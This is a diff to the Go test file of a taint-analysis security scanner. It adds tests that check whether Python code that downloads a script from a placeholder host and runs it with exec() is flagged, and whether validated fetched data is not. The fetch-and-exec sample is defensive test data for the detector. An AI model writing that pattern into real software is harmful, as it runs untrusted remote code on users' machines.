@@ -106,6 +106,31 @@ fetch("https://example.test", {body: safe});
 	}
 }
 
+func TestRemoteFetchedContentExecutedIsDetected(t *testing.T) {
+	content := "payload = requests.get(\"https://example.invalid/latest.py\").text\nexec(payload)\n"
+	findings, err := NewTaint().Analyze(context.Background(), skil.AnalysisContext{Artifact: artifactWith("run.py", content)})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !hasRule(findings, "SKIL-TAINT-EXECUTION") {
+		t.Fatalf("expected remote-fetched content reaching exec to be detected: %#v", findings)
+	}
+	if !hasRule(findings, "SKIL-OUTPUT-EXECUTION") {
+		t.Fatalf("expected the composed unvalidated-generated-output-execution finding: %#v", findings)
+	}
+}
+
+func TestRemoteFetchedContentValidatedBeforeUseIsSafe(t *testing.T) {
+	content := "payload = requests.get(\"https://example.invalid/manifest.json\").json()\nresult = validate_schema(payload)\n"
+	findings, err := NewTaint().Analyze(context.Background(), skil.AnalysisContext{Artifact: artifactWith("run.py", content)})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if hasRule(findings, "SKIL-TAINT-EXECUTION") {
+		t.Fatalf("validated remote content that never reaches exec/eval should not fire: %#v", findings)
+	}
+}
+
 func TestTaintTrackingUsesWholeArtifactFunctionSummaries(t *testing.T) {
 	artifact := skil.Artifact{Files: []skil.File{
 		{Path: "source.py", Data: []byte("def load_token():\n    return os.getenv(\"TOKEN\")\n")},
